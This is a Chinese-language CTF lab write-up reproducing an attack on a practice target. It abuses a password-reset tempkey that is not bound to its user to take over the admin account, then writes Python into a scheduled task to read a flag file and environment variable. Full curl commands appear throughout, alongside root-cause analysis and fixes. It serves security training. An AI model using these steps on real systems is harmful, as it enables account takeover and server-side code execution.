# 260730 靶场渗透复现报告

> 靶场平台：好靶场  
> 目标地址：`http://hbc2.haobachang.com:44663`  
> 漏洞类型：业务逻辑漏洞、越权重置密码、管理员功能导致代码执行  
> 攻击链：注册普通用户 -> 获取临时凭证 -> 越权重置管理员密码 -> 管理员登录 -> 修改定时任务脚本 -> 读取 Flag  
> 最终 Flag：`flag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81_9aef1751}`

---

## 一、实验结论

本次复现的核心问题是密码重置流程中的 `tempkey` 只校验了“是否存在、是否过期”，没有和申请该凭证的用户绑定。

因此可以先用自己注册的普通用户通过 `/api/check` 获取合法 `tempkey`，再把这个 `tempkey` 带到 `/api/reset` 中修改管理员账号 `haoyuwang@haobachang.com` 的密码。获得管理员权限后，利用后台定时任务脚本编辑功能写入 Python 代码，等待调度执行，最后从任务输出中读取 `/tmp/flag.txt` 和环境变量 `FLAG_VALUE`。

---

## 二、关键数据

| 项目 | 内容 |
|---|---|
| 目标服务 | `http://hbc2.haobachang.com:44663` |
| 普通用户 | `hack@gmail.com` |
| 管理员用户 | `haoyuwang@haobachang.com` |
| 明文密码 | `Hacked1234` |
| Base64 后密码 | `SGFja2VkMTIzNA==` |
| 任务编号 | `1` |
| 调度周期 | 30 秒 |

密码字段传输时使用 Base64 编码，例如：

```bash
echo -n 'Hacked1234' | base64
```

得到：

```text
SGFja2VkMTIzNA==
```

这里的 Base64 只是编码，不是加密。它不能提供安全性，只是把明文变成另一种可传输格式。

---

## 三、攻击流程总览

```text
注册普通用户
    |
    v
用普通用户旧密码调用 /api/check
    |
    v
获得 120 秒有效期的 tempkey
    |
    v
用该 tempkey 调用 /api/reset 修改管理员密码
    |
    v
管理员登录获得 JWT
    |
    v
PUT /api/tasks/1/script 写入 Python 读 Flag 代码
    |
    v
等待定时任务执行
    |
    v
GET /api/tasks/1/status 读取执行输出
```

---

## 四、详细复现过程与原理

### 1. 注册普通用户

#### 操作命令

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/register \
  -H "Content-Type: application/json" \
  -d '{"user":"hack@gmail.com","pwd":"SGFja2VkMTIzNA==","pwd2":"SGFja2VkMTIzNA=="}'
```

#### 返回结果

```json
{"status":"yes","message":"注册成功"}
```

#### 原理说明

`/api/register` 是公开接口，不需要登录即可访问。请求体中的字段含义如下：

| 字段 | 含义 |
|---|---|
| `user` | 注册邮箱 |
| `pwd` | Base64 后的新密码 |
| `pwd2` | 二次确认密码 |

注册成功后，攻击者获得了一个合法的普通用户身份。普通用户本身不是管理员，不能直接访问后台任务管理功能，但它可以参与密码校验流程，这是后续利用逻辑漏洞的前提。

---

### 2. 通过 `/api/check` 获取临时凭证

#### 操作命令

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/check \
  -H "Content-Type: application/json" \
  -d '{"user":"hack@gmail.com","oldpwd":"SGFja2VkMTIzNA=="}'
```

#### 返回结果

```json
{"status":"yes","tempkey":"f64ee2cb","expires_in":120,"message":null}
```

后续因为操作过程超过了 120 秒，该凭证过期，所以重新申请了一次：

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/check \
  -H "Content-Type: application/json" \
  -d '{"user":"hack@gmail.com","oldpwd":"SGFja2VkMTIzNA=="}'
```

返回：

```json
{"status":"yes","tempkey":"cb90bd6a","expires_in":120,"message":null}
```

#### 原理说明

`/api/check` 的设计意图是密码重置的第一步：

1. 用户提交账号 `user` 和旧密码 `oldpwd`。
2. 服务端验证旧密码是否正确。
3. 如果验证通过，返回一个短期有效的 `tempkey`。
4. 用户再拿这个 `tempkey` 去 `/api/reset` 设置新密码。

正常情况下，`tempkey` 应该同时绑定以下信息：

| 应绑定内容 | 安全意义 |
|---|---|
| 申请人账号 | 防止拿自己的凭证修改别人的密码 |
| 过期时间 | 防止凭证长期可用 |
| 使用状态 | 防止同一个凭证重复使用 |
| 操作场景 | 防止凭证被用于其他接口 |

本靶场的漏洞点在于：`tempkey` 虽然有过期时间，但没有和 `user` 做强绑定。也就是说，只要拿到一个未过期的合法 `tempkey`，就可以在 `/api/reset` 请求中指定另一个用户作为被修改对象。

---

### 3. 使用普通用户 tempkey 越权重置管理员密码

#### 失败尝试 1：JSON 格式错误

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","temkey":"f64ee2cb"}'
```

返回：

```json
{"detail":[{"type":"json_invalid","loc":["body",8],"msg":"JSON decode error","input":{},"ctx":{"error":"Expecting value"}}]}
```

错误原因：

- `user` 的值缺少左侧双引号。
- 字段名写成了 `temkey`，正确字段应该是 `tempkey`。

#### 失败尝试 2：把命令文本错误写进 JSON

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":""}'""}'
```

返回：

```json
{"detail":[{"type":"json_invalid","loc":["body",73],"msg":"JSON decode error","input":{},"ctx":{"error":"Expecting value"}}]}
```

错误原因：

`tempkey` 字段应该是字符串，例如 `"cb90bd6a"`，不能把一整段 curl 命令直接写进 JSON 值中。

#### 失败尝试 3：临时凭证过期

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":"f64ee2cb"}'
```

返回：

```json
{"detail":{"status":"error","message":"临时凭证已过期"}}
```

原因是 `/api/check` 返回的 `expires_in` 为 `120`，说明 `tempkey` 只有 120 秒有效期。超过有效期后，服务端会拒绝继续使用该凭证。

#### 成功重置管理员密码

重新获取 `tempkey` 后，立即执行重置：

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":"cb90bd6a"}'
```

返回：

```json
{"status":"yes","message":"密码修改成功"}
```

#### 原理说明

这是整条攻击链的核心漏洞。

攻击者先用自己的账号 `hack@gmail.com` 和正确旧密码申请 `tempkey`。按安全设计，这个 `tempkey` 应该只能用于修改 `hack@gmail.com` 的密码。

但实际请求中可以这样构造：

```json
{
  "user": "haoyuwang@haobachang.com",
  "newpwd": "SGFja2VkMTIzNA==",
  "tempkey": "cb90bd6a"
}
```

服务端只判断 `tempkey` 是否存在、是否过期，没有判断：

```text
tempkey 的申请人 == reset 请求里的 user
```

所以普通用户凭证被用于管理员账号，造成越权改密。

这个漏洞属于典型的业务逻辑漏洞，也可以归类为越权访问控制缺陷。接口本身看起来都有校验，但校验对象错了，导致攻击者可以跨用户复用合法凭证。

---

### 4. 使用新密码登录管理员账号

#### 操作命令

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","pwd":"SGFja2VkMTIzNA=="}'
```

#### 返回结果

```json
{
  "status": "yes",
  "token": "<ADMIN_TOKEN>",
  "user": {
    "email": "haoyuwang@haobachang.com",
    "display_name": "王浩宇",
    "role": "admin"
  },
  "message": null
}
```

#### 原理说明

登录成功后，服务端返回 JWT token。后续访问管理员接口时，需要在 HTTP 请求头中加入：

```http
Authorization: Bearer <ADMIN_TOKEN>
```

JWT 的作用是让服务端识别当前访问者身份。这里登录响应中的用户角色为：

```json
"role": "admin"
```

说明当前 token 具备管理员权限，可以访问普通用户不能访问的后台接口。

需要注意：JWT 不是 shell 命令，不能直接复制到终端执行。你在复现中直接输入 token 后出现：

```text
未找到命令
```

这是因为终端把 token 当成了命令名。正确用法是把它放入请求头，或者保存为变量：

```bash
TOKEN='<ADMIN_TOKEN>'
```

---

### 5. 写入定时任务脚本

#### 操作命令

```bash
curl -s -X PUT http://hbc2.haobachang.com:44663/api/tasks/1/script \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"content":"import os\nprint(open(\"/tmp/flag.txt\").read().strip())\nprint(os.environ.get(\"FLAG_VALUE\",\"\"))"}'
```

#### 返回结果

```json
{"status":"yes","message":"脚本已保存，将在下一个调度周期执行"}
```

#### 原理说明

管理员后台存在任务脚本管理接口：

```http
PUT /api/tasks/1/script
```

该接口允许管理员修改任务 `1` 的脚本内容。根据返回信息可知，脚本不会马上执行，而是在下一个调度周期执行。

写入的脚本内容为：

```python
import os
print(open("/tmp/flag.txt").read().strip())
print(os.environ.get("FLAG_VALUE", ""))
```

这段代码做了两件事：

1. 读取 `/tmp/flag.txt` 文件内容。
2. 读取环境变量 `FLAG_VALUE`。

很多 CTF 靶场会把 Flag 放在文件、环境变量或两者之一中。这里同时读取两个位置，可以提高成功率。

这个步骤本质上是利用了“管理员可控脚本内容 + 服务端定时执行脚本”的能力。因为脚本由服务端 Python 运行，所以它可以访问服务端本地文件和环境变量，从而形成代码执行效果。

---

### 6. 等待调度执行并读取任务输出

#### 操作命令

```bash
sleep 30

curl -s -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  http://hbc2.haobachang.com:44663/api/tasks/1/status
```

#### 返回结果

```json
{
  "enabled": true,
  "interval_seconds": 30,
  "last_run_at": "2026-07-30T08:35:11.562130",
  "last_status": "success",
  "last_output": "flag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81_9aef1751}\nflag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81}\n"
}
```

#### 原理说明

`/api/tasks/1/status` 用来查看任务状态和最近一次运行结果。关键字段如下：

| 字段 | 含义 |
|---|---|
| `enabled` | 任务是否启用 |
| `interval_seconds` | 调度周期，这里是 30 秒 |
| `last_run_at` | 最近一次运行时间 |
| `last_status` | 最近一次运行状态 |
| `last_output` | 最近一次脚本标准输出 |

因为写入脚本时使用了 `print()`，脚本运行后的输出会被记录在 `last_output` 字段中。最终得到两个值：

```text
flag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81_9aef1751}
flag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81}
```

其中第一个来自 `/tmp/flag.txt`，第二个来自环境变量 `FLAG_VALUE`。

---

## 五、漏洞成因分析

### 1. `tempkey` 没有绑定用户

安全的密码重置逻辑应该类似：

```text
check 阶段：
  验证 user + oldpwd
  生成 tempkey
  保存 tempkey -> user 的绑定关系

reset 阶段：
  验证 tempkey 是否存在
  验证 tempkey 是否过期
  验证 tempkey 是否属于当前 user
  验证通过后才能修改该 user 的密码
```

靶场中的逻辑缺少第三步：

```text
验证 tempkey 是否属于当前 user
```

所以导致攻击者可以用自己的 `tempkey` 修改管理员密码。

### 2. 管理员功能缺少执行隔离

定时任务脚本由管理员可编辑，并在服务端执行。如果这是生产系统，至少应满足：

| 风险点 | 防护建议 |
|---|---|
| 脚本可读本地文件 | 使用沙箱、容器、最小权限用户运行 |
| 脚本可读环境变量 | 敏感变量不要暴露给任务运行环境 |
| 脚本输出可回显 | 对输出内容做权限控制和脱敏 |
| 任意 Python 代码执行 | 限制 DSL 或白名单任务模板，不直接执行用户输入 |

本靶场中管理员权限本身就是高危权限，一旦通过改密拿到管理员身份，就可以通过该功能进一步读取服务端敏感数据。

---

## 六、复现中的注意点

### 1. 端口必须写真实端口

复现中多次出现：

```text
http://hbc2.haobachang.com:XXXXX
```

`XXXXX` 是占位符，实际请求不会成功。应替换为真实端口：

```text
http://hbc2.haobachang.com:44663
```

### 2. JSON 字符串必须严格合法

错误示例：

```json
{"user":haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","temkey":"f64ee2cb"}
```

正确示例：

```json
{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":"f64ee2cb"}
```

注意点：

- 字符串值必须用双引号包裹。
- 字段名必须拼写正确，`tempkey` 不能写成 `temkey`。
- JSON 的值不能直接写 shell 命令。

### 3. `tempkey` 有效期很短

`/api/check` 返回：

```json
"expires_in": 120
```

说明临时凭证有效期只有 120 秒。拿到后应立即调用 `/api/reset`，否则会出现：

```json
{"detail":{"status":"error","message":"临时凭证已过期"}}
```

### 4. Bearer token 要放在请求头

错误用法：

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

正确用法：

```bash
curl -s -H "Authorization: Bearer <ADMIN_TOKEN>" \
  http://hbc2.haobachang.com:44663/api/tasks/1/status
```

### 5. `-H` 行尾续行不要带多余字符

推荐写法：

```bash
curl -s -X PUT http://hbc2.haobachang.com:44663/api/tasks/1/script \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"content":"import os\nprint(open(\"/tmp/flag.txt\").read().strip())\nprint(os.environ.get(\"FLAG_VALUE\",\"\"))"}'
```

在 shell 中，反斜杠 `\` 必须是行尾最后一个字符。如果后面还有空格或其他字符，可能导致命令解析异常。

---

## 七、最终完整命令

下面是整理后的最短成功路径。

### 1. 注册普通用户

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/register \
  -H "Content-Type: application/json" \
  -d '{"user":"hack@gmail.com","pwd":"SGFja2VkMTIzNA==","pwd2":"SGFja2VkMTIzNA=="}'
```

### 2. 获取 tempkey

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/check \
  -H "Content-Type: application/json" \
  -d '{"user":"hack@gmail.com","oldpwd":"SGFja2VkMTIzNA=="}'
```

### 3. 越权修改管理员密码

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/reset \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","newpwd":"SGFja2VkMTIzNA==","tempkey":"<TEMPKEY>"}'
```

### 4. 管理员登录

```bash
curl -s -X POST http://hbc2.haobachang.com:44663/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"haoyuwang@haobachang.com","pwd":"SGFja2VkMTIzNA=="}'
```

### 5. 写入读 Flag 脚本

```bash
curl -s -X PUT http://hbc2.haobachang.com:44663/api/tasks/1/script \
  -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"content":"import os\nprint(open(\"/tmp/flag.txt\").read().strip())\nprint(os.environ.get(\"FLAG_VALUE\",\"\"))"}'
```

### 6. 查看任务输出

```bash
sleep 30

curl -s -H "Authorization: Bearer <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  http://hbc2.haobachang.com:44663/api/tasks/1/status
```

---

## 八、防护建议

1. `tempkey` 必须和用户身份绑定，`reset` 阶段校验 `tempkey.owner == user`。
2. `tempkey` 应设置一次性使用，用完立即失效。
3. 密码重置接口应增加频率限制，防止批量尝试。
4. 管理员操作应记录审计日志，包括修改任务脚本、修改用户密码等高危行为。
5. 后端不要直接执行用户可控代码。确需任务脚本能力时，应使用沙箱、低权限账号、容器隔离和敏感环境变量隔离。
6. Base64 不能当作密码加密方案。传输层应依赖 HTTPS，存储层应使用强哈希算法，例如 bcrypt、Argon2。

---

## 九、总结

本次靶场的突破点不是传统注入漏洞，而是密码重置流程中的业务逻辑缺陷。攻击者通过正常注册获得普通用户身份，再利用 `tempkey` 未绑定用户的问题实现跨账号改密，最终接管管理员账号。

接管管理员后，系统提供的定时任务脚本编辑功能可以让管理员写入 Python 代码并由服务端执行。通过读取 `/tmp/flag.txt` 和 `FLAG_VALUE`，成功获得最终 Flag：

```text
flag{b8fa1b60-8ce1-4f20-b60f-8b7aa3419f81_9aef1751}
```
